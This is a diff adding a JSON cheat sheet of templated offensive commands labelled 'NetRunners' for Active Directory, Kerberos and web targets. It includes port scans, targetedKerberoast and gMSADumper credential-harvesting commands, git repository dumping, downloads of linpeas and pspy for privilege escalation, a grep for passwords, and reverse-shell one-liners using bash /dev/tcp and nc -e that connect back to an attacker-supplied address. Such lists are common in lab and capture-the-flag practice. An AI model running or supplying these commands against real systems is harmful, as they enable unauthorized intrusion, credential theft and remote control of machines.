@@ -1,0 +1,126 @@
+{
+  "security-recon-nmap": {
+    "examples": [
+      {
+        "description": "NetRunners Active Directory/enumeration",
+        "command": "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv"
+      },
+      {
+        "description": "NetRunners KERBEROS/enumeration",
+        "command": "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv"
+      },
+      {
+        "description": "NetRunners web/enumeration",
+        "command": "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv"
+      }
+    ]
+  },
+  "network-remote-ssh": {
+    "examples": [
+      {
+        "description": "NetRunners Active Directory/enumeration",
+        "command": "ssh {{USER}}@{{IP}}"
+      },
+      {
+        "description": "NetRunners Active Directory/enumeration",
+        "command": "ssh {{USER}}@{{IP}} -i id_rsa"
+      },
+      {
+        "description": "NetRunners KERBEROS/enumeration",
+        "command": "ssh {{USER}}@{{IP}}"
+      },
+      {
+        "description": "NetRunners KERBEROS/enumeration",
+        "command": "ssh {{USER}}@{{IP}} -i id_rsa"
+      }
+    ]
+  },
+  "network-transfer-ftp": {
+    "examples": [
+      {
+        "description": "NetRunners Active Directory/enumeration",
+        "command": "ftp -a {{IP}}"
+      },
+      {
+        "description": "NetRunners Active Directory/enumeration",
+        "command": "ftp {{USER}}@{{IP}}"
+      },
+      {
+        "description": "NetRunners KERBEROS/enumeration",
+        "command": "ftp -a {{IP}}"
+      },
+      {
+        "description": "NetRunners KERBEROS/enumeration",
+        "command": "ftp {{USER}}@{{IP}}"
+      }
+    ]
+  },
+  "dev-runtime-python3": {
+    "examples": [
+      {
+        "description": "NetRunners Active Directory/exploitation",
+        "command": "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' --request-user TARGET_USER"
+      },
+      {
+        "description": "NetRunners Active Directory/post-exploitation",
+        "command": "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}"
+      },
+      {
+        "description": "NetRunners KERBEROS/exploitation",
+        "command": "python3 targetedKerberoast.py -k --dc-host {{DC.DOMAIN}} -u {{USER}} -d {{DOMAIN}}"
+      },
+      {
+        "description": "NetRunners web/exploitation",
+        "command": "python3 git_dumper.py {{URL}} git_dump"
+      }
+    ]
+  },
+  "network-http-wget": {
+    "examples": [
+      {
+        "description": "NetRunners usefull/shell",
+        "command": "wget {{URL}}/pspy"
+      },
+      {
+        "description": "NetRunners usefull/shell",
+        "command": "wget {{URL}}/linpeas.sh"
+      }
+    ]
+  },
+  "system-file-find": {
+    "examples": [
+      {
+        "description": "NetRunners usefull/shell",
+        "command": "find / -perm -4000 2>/dev/null"
+      }
+    ]
+  },
+  "text-search-grep": {
+    "examples": [
+      {
+        "description": "NetRunners usefull/shell",
+        "command": "grep -r --color=always 'password' ."
+      }
+    ]
+  },
+  "system-shell-bash": {
+    "examples": [
+      {
+        "description": "NetRunners revshell/shell",
+        "command": "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1"
+      }
+    ]
+  },
+  "network-socket-nc": {
+    "examples": [
+      {
+        "description": "NetRunners revshell/shell",
+        "command": "nc.exe {{IP}} {{PORT}} -e cmd"
+      },
+      {
+        "description": "NetRunners revshell/shell",
+        "command": "nc -e /bin/bash {{IP}} {{PORT}}"
+      }
+    ]
+  }
+}
